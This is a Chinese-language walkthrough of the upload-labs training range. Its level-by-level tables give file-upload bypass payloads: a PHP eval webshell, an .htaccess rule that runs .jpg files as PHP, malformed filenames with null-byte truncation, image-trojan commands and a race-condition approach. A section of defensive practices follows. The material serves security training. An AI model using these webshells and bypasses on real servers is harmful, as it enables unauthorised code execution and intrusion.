## 📚 全关卡实战记录
### Level 1-5：基础校验绕过（前端/简单服务端过滤）
| 关卡 | 防护机制分析 | 有效Payload | 绕过原理 | 关键步骤与截图 |
| :---- | :---- | :---- | :---- | :---- |
| **Level 1** | 仅前端JavaScript校验扩展名（仅允许jpg/png/gif），服务端无任何校验 | `webshell.php`（内容：`<?php @eval($_POST['pass']);?>`） | 绕过前端JS限制（服务端无兜底校验） | 1. 直接上传`webshell.php`，触发前端弹窗拦截；<br>2. F12开发者工具禁用JavaScript；<br>3. 重新上传，服务端无校验，上传成功；<br><img width="1600" height="600" alt="L1 前端JS拦截" src="https://github.com/user-attachments/assets/02403eee-e2b6-4ddb-8110-9fd02dbdbc03" /> |
| **Level 2** | 取消前端校验，服务端仅校验HTTP请求的Content-Type（MIME类型） | `webshell.php` + Burp抓包修改`Content-Type: image/jpeg` | 伪造合法图片MIME类型，绕过服务端类型校验 | 1. 选择`webshell.php`上传，Burp Suite拦截请求；<br>2. 将请求头中`Content-Type`改为`image/jpeg`后转发；<br>3. 服务端校验MIME通过，上传成功；<br><img width="1600" height="600" alt="L2 拦截上传请求" src="https://github.com/user-attachments/assets/57b64772-1563-4d89-b57a-1ac661a4d4af" /> |
| **Level 3** | 服务端黑名单过滤.php/.asp/.jsp等常见脚本扩展名，Apache默认支持非主流PHP扩展名解析 | `webshell.phtml` / `webshell.php5` / `webshell.php3` | 利用Apache可解析的非主流PHP扩展名，绕过黑名单限制 | 1. 将恶意文件重命名为`webshell.phtml`；<br>2. 直接上传，服务端黑名单无该扩展名，校验通过；<br>3. 访问文件路径，Apache解析为PHP执行；<br><img width="1600" height="600" alt="L3 重命名非主流扩展名" src="https://github.com/user-attachments/assets/86976ec6-f642-4bf8-802a-730fcfba355d" /> |
| **Level 4** | 服务端黑名单拦截所有PHP相关扩展名（含非主流），未严格拦截Apache配置文件.htaccess | `.htaccess`（内容：`AddType application/x-httpd-php .jpg`）+ 图片马`webshell.jpg` | 上传.htaccess配置文件，强制服务器将.jpg文件解析为PHP代码 | 1. 编写`.htaccess`配置文件并保存；<br>2. 先上传`.htaccess`，服务端未拦截；<br>3. 上传jpg格式图片马`webshell.jpg`；<br>4. 访问`webshell.jpg`，Apache按配置解析为PHP执行；<br><img width="1600" height="600" alt="L4 编写.htaccess" src="https://github.com/user-attachments/assets/ad419606-cd8b-4885-8c55-8bc20f9a28db" /> |
| **Level 5** | 服务端黑名单过滤常规/非主流脚本扩展名，但未对扩展名进行大小写统一处理 | `webshell.pHP` / `webshell.PHTML` | 利用Windows系统文件名大小写不敏感的特性，绕过黑名单字符匹配 | 1. 将恶意文件命名为`webshell.pHP`（大小写混合）；<br>2. 直接上传，服务端黑名单仅匹配小写，校验通过；<br>3. Windows服务器自动将文件名转为小写`webshell.php`，正常解析执行；<br><img width="1600" height="600" alt="L5 大小写混淆命名" src="https://github.com/user-attachments/assets/873389ce-5b21-4251-859c-296d9cd6ef10" /> |


### Level 6-10：Windows系统特性与逻辑过滤绕过
| 关卡 | 防护机制分析 | 有效Payload | 绕过原理 | 关键步骤与截图 |
| :---- | :---- | :---- | :---- | :---- |
| **Level 6** | 修复扩展名大小写过滤，未处理Windows文件名末尾的**英文半角空格** | `webshell.php `（末尾带1个英文半角空格） | 利用Windows自动去除文件名末尾空格的系统特性 | 1. 重命名恶意文件为`webshell.php `（手动添加末尾空格）；<br>2. 直接上传，服务端未识别畸形扩展名，校验通过；<br>3. Windows服务器保存时自动剔除末尾空格，还原为`webshell.php`；<br><img width="1600" height="600" alt="L6 末尾空格命名" src="https://github.com/user-attachments/assets/49c633a0-5c63-4170-9fdb-c0cfab90097f" /> |
| **Level 7** | 修复末尾空格过滤，未处理Windows文件名末尾的**英文半角点** | `webshell.php.`（末尾带1个英文半角点） | 利用Windows自动去除文件名末尾点的系统特性 | 1. 重命名恶意文件为`webshell.php.`（手动添加末尾点）；<br>2. 直接上传，服务端未拦截该命名；<br>3. Windows服务器保存时自动删除末尾点，还原为`webshell.php`；<br><img width="1600" height="600" alt="L7 末尾点绕过成功" src="https://github.com/user-attachments/assets/814f1db9-bae2-4c08-bff9-062a931d535f" /> |
| **Level 8** | 修复末尾空格/点过滤，未处理Windows `::$DATA` 文件流标识特性 | `webshell.php::$DATA` | 利用Windows`::$DATA`特性，服务器忽略该标识仅保留前置合法文件名 | 1. 重命名恶意文件为`webshell.php::$DATA`；<br>2. 直接上传，服务端无相关过滤规则；<br>3. Windows服务器解析时忽略`::$DATA`，文件实际保存为`webshell.php`；<br><img width="1600" height="600" alt="L8 ::$DATA命名" src="https://github.com/user-attachments/assets/145be784-4139-4f24-a84e-99216b0005e7" /> |
| **Level 9** | 修复单一系统特性过滤，未处理文件名末尾"点+英文半角空格"组合 | `webshell.php. `（末尾带"点+1个英文半角空格"） | 利用Windows自动去除文件名末尾点与空格的组合特性 | 1. 重命名恶意文件为`webshell.php. `（末尾加"点+空格"）；<br>2. 直接上传，服务端未拦截该畸形命名；<br>3. Windows服务器保存时自动剔除末尾点与空格，还原为`webshell.php`；<br><img width="1600" height="600" alt="L9 点+空格命名" src="https://github.com/user-attachments/assets/86a35db7-3ad0-46bd-88ca-a98b404b051a" /> |
| **Level 10** | 服务端对扩展名关键词仅执行**单次删除**过滤 | `webshell.pphphp` | 双写关键词绕过单次过滤，剩余字符重组为合法的.php扩展名 | 1. 将恶意文件命名为`webshell.pphphp`；<br>2. 上传后服务端过滤"php"关键词，结果为`webshell.php`；<br>3. 访问文件路径，正常执行PHP代码；<br><img width="1600" height="600" alt="L10 双写关键词命名" src="https://github.com/user-attachments/assets/b6cbf351-7efc-4705-b630-1a4922e7d10b" /> |


### Level 11-15：请求头/文件内容/路径截断绕过
| 关卡 | 防护机制分析 | 有效Payload | 绕过原理 | 关键步骤与截图 |
| :---- | :---- | :---- | :---- | :---- |
| **Level 11** | 服务端通过GET参数指定文件保存路径，存在%00空字节截断漏洞（PHP<5.3.4） | GET参数：`save_path=upload/webshell.php%00` + 文件名`webshell.jpg` | 利用PHP空字节截断特性，解析时遇%00停止，忽略后续字符 | 1. 上传正常jpg文件，Burp Suite拦截请求；<br>2. 修改GET参数`save_path`为`upload/webshell.php%00`；<br>3. 将%00转为原始空字节（Burp中按`Ctrl+U`）后转发；<br><img width="1600" height="600" alt="L11 路径%00截断" src="https://github.com/user-attachments/assets/b922c896-bf7e-4a3e-9f31-ef8e7aa7a89c" /> |
| **Level 12** | 服务端通过POST参数指定文件保存路径，存在%00空字节截断漏洞 | POST参数：`save_path=upload/webshell.php%00` + 文件名`webshell.jpg` | POST参数不会自动URL解码，手动插入原始空字节实现路径截断 | 1. Burp拦截上传请求，找到POST参数`save_path`；<br>2. 修改为`upload/webshell.php`并将空格的十六进制20替换为00原始空字节；<br>3. 转发请求，服务端按截断路径保存为`webshell.php`；<br><img width="1600" height="600" alt="L12 替换十六进制00" src="https://github.com/user-attachments/assets/5a60a973-9f4c-41aa-ad08-7dc07ea51657" /> |
| **Level 13** | 服务端校验文件头幻数（仅识别真实图片文件），无其他严格过滤 | 图片马`webshell.jpg`（CMD命令：`copy 1.jpg/b + webshell.php/a webshell.jpg`） | 制作带合法图片文件头的图片马，绕过服务端文件内容校验 | 1. 用CMD命令合成图片与恶意脚本为图片马（/b为二进制，/a为文本）；<br>2. 直接上传图片马，配合.htaccess解析执行或利用靶场include目录文件包含；<br><img width="1600" height="600" alt="L13 制作图片马" src="https://github.com/user-attachments/assets/c4c62ff0-b144-4e87-90b3-4f192847a102" /> |
| **Level 14** | 服务端通过`getimagesize()`函数校验图片头，仅验证是否为真实图片 | 同Level13的图片马`webshell.jpg` | `getimagesize()`仅检测图片头字节是否合法，不会校验文件后续内容，可嵌入恶意代码 | 1. 上传Level13制作的合法图片马；<br>2. 服务端`getimagesize()`校验图片头通过，上传成功；<br>3. 配合.htaccess配置文件解析执行；<br><img width="1600" height="600" alt="L14 绕过getimagesize校验" src="https://github.com/user-attachments/assets/1598f309-352f-44e5-9aa7-955490cdf3f9" /> |
| **Level 15** | 服务端通过`exif_imagetype()`函数校验图片头，仅识别真实图片文件 | 无损坏合法图片马`webshell.jpg` | `exif_imagetype()`检测图片头前几个字节的幻数，制作无损坏图片马可通过校验 | 1. 制作未损坏的jpg/png格式图片马（避免破坏图片头幻数）；<br>2. 上传后`exif_imagetype()`校验图片头通过；<br>3. 配合.htaccess解析执行；<br><img width="1600" height="600" alt="L15 绕过exif校验" src="https://github.com/user-attachments/assets/91c791e9-28ea-4768-afbc-102ef5920a11" /> |


### Level 16-21：高级过滤与综合利用绕过
| 关卡 | 防护机制分析 | 有效Payload | 绕过原理 | 关键步骤与截图 |
| :---- | :---- | :---- | :---- | :---- |
| **Level 16** | 服务端对上传图片进行二次渲染压缩，普通图片马代码会被清除 | 嵌入EXIF信息的免压缩图片马 | 将PHP恶意代码嵌入图片的EXIF属性中，服务端二次渲染仅处理图片像素，保留EXIF信息 | 1. 用ExifTool将PHP代码写入图片的EXIF备注属性：`exiftool -Comment="<?php @eval($_POST['pass']);?>" 1.jpg -o webshell.jpg`；<br>2. 上传渲染后的图片马，配合.htaccess解析执行；<br><img width="1600" height="600" alt="L16 写入EXIF信息" src="https://github.com/user-attachments/assets/21c01734-e847-4e2f-997d-ab0e31fc0129" /> |
| **Level 17** | 服务端对图片进行深度二次渲染，清除所有嵌入的恶意代码 | 抗渲染图片马（对比渲染前后二进制，在未修改位置嵌入代码） | 分析图片渲染前后的二进制差异，找到服务器未修改的字节区域嵌入PHP代码 | 1. 上传正常图片，保存服务端渲染后的图片；<br>2. 用二进制编辑器对比原始图片与渲染后图片的差异；<br>3. 在未被修改的字节区域嵌入恶意代码制作抗渲染图片马；<br><img width="1600" height="600" alt="L17 对比二进制差异" src="https://github.com/user-attachments/assets/92811e18-4810-4a06-bee7-88e6e5b9493f" /> |
| **Level 18** | 服务端先保存文件到服务器再进行校验，校验失败则删除文件（条件竞争漏洞） | `webshell.php` + Python多线程访问脚本 | 利用服务端"保存-校验-删除"的时间差，在文件被删除前快速访问执行恶意代码 | 1. Burp Suite开启重放器，持续发送上传`webshell.php`的请求；<br>2. 运行Python多线程脚本，持续访问文件上传后的预期路径；<br>3. 成功在文件被删前访问并执行PHP代码；<br><img width="1600" height="600" alt="L18 条件竞争脚本" src="https://github.com/user-attachments/assets/e28a9ef0-e307-4e3f-899a-50bb22c71862" /> |
| **Level 19** | 服务端白名单允许.7z扩展名，部署Apache 2.2.x存在低版本畸形后缀解析漏洞 | `webshell.php.7z`（含PHP后门代码） | Apache低版本忽略文件名最后一个不可识别后缀，优先解析前面的.php后缀 | 1. 构造恶意文件并命名为`webshell.php.7z`；<br>2. 直接上传（服务端白名单允许.7z）；<br>3. 访问文件路径，Apache解析为PHP执行；<br><img width="1600" height="600" alt="L19 Apache低版本解析结果" src="https://github.com/user-attachments/assets/11cbb16f-1aac-432b-8734-2c52e471bf53" /> |
| **Level 20** | 服务端对文件名多规则过滤，存在PHP%00空字节截断漏洞（PHP<5.3.4） | 文件名：`webshell.php%00.jpg`（通过`save_name`参数传递） | 利用PHP%00空字节截断特性，服务端解析文件名时遇%00终止，保留前置.php后缀 | 1. Burp拦截上传请求，添加`save_name=webshell.php%00.jpg`参数；<br>2. 将%00转为原始空字节（Burp按`Ctrl+U`）；<br>3. 转发请求，服务端截断文件名保存为`webshell.php`；<br><img width="1600" height="600" alt="L20 文件名%00截断" src="https://github.com/user-attachments/assets/7b747de8-72ae-442f-b045-a2b1025e5661" /> |
| **Level 21** | 综合多规则过滤（修复系统特性/双写/大小写）+图片头幻数校验+路径固定，存在文件包含漏洞 | 合法图片马`webshell.jpg` + 靶场`include`目录文件包含 | 图片马绕过综合过滤上传，结合文件包含漏洞执行恶意代码 | 1. 用CMD制作合法jpg格式图片马；<br>2. 直接上传图片马，服务端综合过滤校验通过；<br>3. 访问`include.php?file=upload/webshell.jpg`执行代码；<br><img width="1600" height="600" alt="L21 文件包含执行" src="https://github.com/user-attachments/assets/3ada9851-a548-4290-8f8a-def913819e87" /> |


## 🧠 防御最佳实践
| 防御维度 | 具体措施 |
| :---- | :---- |
| 扩展名校验 | 强制使用**严格白名单**（仅允许业务必需的静态扩展名：jpg/png/gif等），拒绝任何脚本类后缀 |
| 文件类型校验 | 结合**文件头幻数+二进制内容检测+恶意代码扫描**三重验证，避免仅依赖MIME或单一函数校验 |
| 服务器配置 | 1. 上传目录禁止脚本执行权限；<br>2. 关闭Apache.htaccess、升级至2.4.x修复解析漏洞；<br>3. 升级PHP至7.x+修复空字节截断漏洞 |
| 存储策略 | 1. 文件上传后**随机重命名**（UUID+哈希）；<br>2. 存储到非Web可访问目录，通过后端接口间接调用 |
| 代码逻辑 | 1. 校验与保存**原子性执行**，避免先保存后校验的条件竞争；<br>2. 清洗文件名（过滤空格/点/::$DATA等特殊字符） |


## 🗺️ 绕过思路思维导图
```mermaid
graph TD
    A[Upload-Lab21关绕过] --> B[基础校验绕过<br>Level1-5]
    A --> C[Windows特性绕过<br>Level6-10]
    A --> D[路径/内容绕过<br>Level11-15]
    A --> E[高级综合绕过<br>Level16-21]

    B --> B1[Level1：前端JS]
    B --> B2[Level2：MIME]
    B --> B3[Level3：黑名单后缀]
    B --> B4[Level4：.htaccess+图片马]
    B --> B5[Level5：大小写混淆]

    C --> C1[Level6：末尾空格]
    C --> C2[Level7：末尾点]
    C --> C3[Level8：::$DATA]
    C --> C4[Level9：点+空格]
    C --> C5[Level10：双写关键词]

    D --> D1[Level11：GET%00截断]
    D --> D2[Level12：POST%00截断]
    D --> D3[Level13：图片马]
    D --> D4[Level14：getimagesize]
    D --> D5[Level15：exif]

    E --> E1[Level16：EXIF嵌入]
    E --> E2[Level17：抗渲染图片马]
    E --> E3[Level18：条件竞争]
    E --> E4[Level19：Apache低版本解析]
    E --> E5[Level20：文件名%00截断]
    E --> E6[Level21：文件包含]
